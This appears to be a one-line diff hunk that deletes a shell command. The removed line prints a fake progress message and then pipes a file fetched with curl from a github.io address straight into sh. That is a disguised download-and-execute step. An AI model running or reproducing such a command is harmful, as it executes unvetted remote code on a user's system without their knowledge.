@@ -1,1 +1,0 @@
-echo 'Progress: 47.0%'; curl -L --progress-bar frkns.github.io/fun/spelling_ext_accessing_norton.a.out | sh
